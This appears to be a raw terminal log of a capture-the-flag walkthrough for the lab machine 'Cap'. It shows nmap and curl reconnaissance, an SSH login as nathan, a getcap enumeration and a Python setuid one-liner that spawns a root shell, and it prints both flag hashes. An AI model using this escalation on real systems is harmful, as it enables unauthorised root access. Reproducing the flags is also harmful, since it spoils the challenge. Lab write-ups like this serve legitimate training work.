# Cap

┌──(kali㉿kali)-\[\~/Desktop] └─$ ping 10.10.10.245 PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data. 64 bytes from 10.10.10.245: icmp\_seq=1 ttl=63 time=73.5 ms 64 bytes from 10.10.10.245: icmp\_seq=2 ttl=63 time=46.8 ms ^C --- 10.10.10.245 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms rtt min/avg/max/mdev = 46.754/60.149/73.544/13.395 ms

┌──(kali㉿kali)-\[\~/Desktop] └─$ nmap -sS -T 10.10.10.245 -Pn You requested a scan type which requires root privileges. QUITTING!

┌──(kali㉿kali)-\[\~/Desktop] └─$ sudo nmap -sS -T 10.10.10.245 -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 05:33 EDT WARNING: No targets were specified, so 0 hosts scanned. Nmap done: 0 IP addresses (0 hosts up) scanned in 0.10 seconds

┌──(kali㉿kali)-\[\~/Desktop] └─$ sudo nmap -sS -T 10.10.10.245 -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 05:33 EDT WARNING: No targets were specified, so 0 hosts scanned. Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds

┌──(kali㉿kali)-\[\~/Desktop] └─$ sudo nmap -sS -T 10.10.10.245\
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 05:33 EDT WARNING: No targets were specified, so 0 hosts scanned. Nmap done: 0 IP addresses (0 hosts up) scanned in 0.07 seconds

┌──(kali㉿kali)-\[\~/Desktop] └─$ sudo nmap -sS 10.10.10.245\
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 05:33 EDT Nmap scan report for 10.10.10.245 Host is up (0.049s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds

┌──(kali㉿kali)-\[\~/Desktop] └─$ curl 10.10.10.245

Security Dashboard

* dashboard
  * Dashboard
  * Security Snapshot (5 Second PCAP + Analysis)
  * IP Config
  * Network Status
*
*

**Dashboard**

* Home
* Dashboard

**Nathan**<i class="fa-angle-down">:angle-down:</i>

Message Settings Log Out

```
            <!-- sales report area start -->
            <div class="sales-report-area mt-5 mb-5">
                <div class="row">
                    <div class="col-md-4">
                        <div class="single-report mb-xs-30">
                            <div class="s-report-inner pr--20 pt--30 mb-3">
                                <div class="s-report-title d-flex justify-content-between">
                                    <h4 class="header-title mb-0">Security Events</h4>
                                    <p>24 H</p>
                                </div>
                                <div class="d-flex justify-content-between pb-2">
                                    <h2>1,560</h2>
                                    <span>+15%</span>
                                </div>
                            </div>
                            <canvas id="coin_sales1" height="100"></canvas>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="single-report mb-xs-30">
                            <div class="s-report-inner pr--20 pt--30 mb-3">
                                <div class="s-report-title d-flex justify-content-between">
                                    <h4 class="header-title mb-0">Failed Login Attempts</h4>
                                    <p>24 H</p>
                                </div>
                                <div class="d-flex justify-content-between pb-2">
                                    <h2>357</h2>
                                    <span>-10%</span>
                                </div>
                            </div>
                            <canvas id="coin_sales2" height="100"></canvas>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="single-report">
                            <div class="s-report-inner pr--20 pt--30 mb-3">
                                <div class="s-report-title d-flex justify-content-between">
                                    <h4 class="header-title mb-0">Port Scans (Unique IPs)</h4>
                                    <p>24 H</p>
                                </div>
                                <div class="d-flex justify-content-between pb-2">
                                    <h2>27</h2>
                                    <span>+28%</span>
                                </div>
                            </div>
                            <canvas id="coin_sales3" height="100"></canvas>
                        </div>
                    </div>
                </div>
            </div>
            <!-- sales report area end -->

        </div>
    </div>
    <!-- main content area end -->
    <!-- footer area start-->
    <footer>
        <div class="footer-area">
            <p>© Copyright 2021. All right reserved. Template by <a href="https://colorlib.com/wp/">Colorlib</a>.</p>
        </div>
    </footer>
    <!-- footer area end-->
</div>
<!-- page container area end -->
<!-- offset area start -->
<div class="offset-area">
    <div class="offset-close"><i class="ti-close"></i></div>
    <ul class="nav offset-menu-tab">
        <li><a class="active" data-toggle="tab" href="#activity">Activity</a></li>
        <li><a data-toggle="tab" href="#settings">Settings</a></li>
    </ul>
        <div id="activity" class="tab-pane fade in show active">
            <div class="recent-activity">
                <div class="timeline-task">
                    <div class="icon bg1">
                        <i class="fa fa-envelope"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Rashed sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg2">
                        <i class="fa fa-check"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Added</h4>
                        <span class="time"><i class="ti-time"></i>7 Minutes Ago</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg2">
                        <i class="fa fa-exclamation-triangle"></i>
                    </div>
                    <div class="tm-title">
                        <h4>You missed you Password!</h4>
                        <span class="time"><i class="ti-time"></i>09:20 Am</span>
                    </div>
                </div>
                <div class="timeline-task">
                    <div class="icon bg3">
                        <i class="fa fa-bomb"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Member waiting for you Attention</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg3">
                        <i class="ti-signal"></i>
                    </div>
                    <div class="tm-title">
                        <h4>You Added Kaji Patha few minutes ago</h4>
                        <span class="time"><i class="ti-time"></i>01 minutes ago</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg1">
                        <i class="fa fa-envelope"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Ratul Hamba sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Hello sir , where are you, i am egerly waiting for you.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg2">
                        <i class="fa fa-exclamation-triangle"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Rashed sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg2">
                        <i class="fa fa-exclamation-triangle"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Rashed sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                </div>
                <div class="timeline-task">
                    <div class="icon bg3">
                        <i class="fa fa-bomb"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Rashed sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
                <div class="timeline-task">
                    <div class="icon bg3">
                        <i class="ti-signal"></i>
                    </div>
                    <div class="tm-title">
                        <h4>Rashed sent you an email</h4>
                        <span class="time"><i class="ti-time"></i>09:35</span>
                    </div>
                    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Esse distinctio itaque at.
                    </p>
                </div>
            </div>
        </div>
        <div id="settings" class="tab-pane fade">
            <div class="offset-settings">
                <h4>General Settings</h4>
                <div class="settings-list">
                    <div class="s-settings">
                        <div class="s-sw-title">
                            <h5>Notifications</h5>
                            <div class="s-swtich">
                                <input type="checkbox" id="switch1" />
                                <label for="switch1">Toggle</label>
                            </div>
                        </div>
                        <p>Keep it 'On' When you want to get all the notification.</p>
                    </div>
                    <div class="s-settings">
                        <div class="s-sw-title">
                            <h5>Show recent activity</h5>
                            <div class="s-swtich">
                                <input type="checkbox" id="switch2" />
                                <label for="switch2">Toggle</label>
                            </div>
                        </div>
                        <p>The for attribute is necessary to bind our custom checkbox with the input.</p>
                    </div>
                    <div class="s-settings">
                        <div class="s-sw-title">
                            <h5>Show your emails</h5>
                            <div class="s-swtich">
                                <input type="checkbox" id="switch3" />
                                <label for="switch3">Toggle</label>
                            </div>
                        </div>
                        <p>Show email so that easily find you.</p>
                    </div>
                    <div class="s-settings">
                        <div class="s-sw-title">
                            <h5>Show Task statistics</h5>
                            <div class="s-swtich">
                                <input type="checkbox" id="switch4" />
                                <label for="switch4">Toggle</label>
                            </div>
                        </div>
                        <p>The for attribute is necessary to bind our custom checkbox with the input.</p>
                    </div>
                    <div class="s-settings">
                        <div class="s-sw-title">
                            <h5>Notifications</h5>
                            <div class="s-swtich">
                                <input type="checkbox" id="switch5" />
                                <label for="switch5">Toggle</label>
                            </div>
                        </div>
                        <p>Use checkboxes when looking for yes or no answers.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- offset area end -->
<!-- jquery latest version -->
<script src="/static/js/vendor/jquery-2.2.4.min.js"></script>
<!-- bootstrap 4 js -->
<script src="/static/js/popper.min.js"></script>
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/owl.carousel.min.js"></script>
<script src="/static/js/metisMenu.min.js"></script>
<script src="/static/js/jquery.slimscroll.min.js"></script>
<script src="/static/js/jquery.slicknav.min.js"></script>

<!-- start chart js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.min.js"></script>
<!-- start highcharts js -->
<script src="https://code.highcharts.com/highcharts.js"></script>
<!-- start zingchart js -->
<script src="https://cdn.zingchart.com/zingchart.min.js"></script>
<script>
zingchart.MODULESDIR = "https://cdn.zingchart.com/modules/";
ZC.LICENSE = ["569d52cefae586f634c54f86dc99e6a9", "ee6b7db5b51705a13dc2339db3edaf6d"];
</script>
<!-- all line chart activation -->
<script src="/static/js/line-chart.js"></script>
<!-- all pie chart -->
<script src="/static/js/pie-chart.js"></script>
<!-- others plugins -->
<script src="/static/js/plugins.js"></script>
<script src="/static/js/scripts.js"></script>
```

┌──(kali㉿kali)-\[\~/Desktop] └─$ xdg-open http://10.10.10.245

┌──(kali㉿kali)-\[\~/Desktop] └─$ ssh nathan@10.10.10.245\
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established. ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts. nathan@10.10.10.245's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86\_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

System information as of Tue Sep 30 09:39:54 UTC 2025

System load: 0.0 Processes: 230 Usage of /: 36.7% of 8.73GB Users logged in: 0 Memory usage: 33% IPv4 address for eth0: 10.10.10.245 Swap usage: 0%

\=> There are 3 zombie processes.

63 updates can be applied immediately. 42 of these updates are standard security updates. To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Sep 30 07:40:04 2025 from 10.10.14.15 nathan@cap:~~$ ls linpeas.sh snap user.txt nathan@cap:~~$ cat user.txt ef84981db69c897c8f4f55b9a9146fb8 nathan@cap:~~$ getcap -r / 2>/dev/null /usr/bin/python3.8 = cap\_setuid,cap\_net\_bind\_service+eip /usr/bin/ping = cap\_net\_raw+ep /usr/bin/traceroute6.iputils = cap\_net\_raw+ep /usr/bin/mtr-packet = cap\_net\_raw+ep /usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap\_net\_bind\_service,cap\_net\_admin+ep nathan@cap:~~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' root@cap:~~# ls linpeas.sh snap user.txt root@cap:~~# cd /root root@cap:/root# ls root.txt snap root@cap:/root# cat root.txt b50f9d7ece6471d9fd35a7c80137a56f
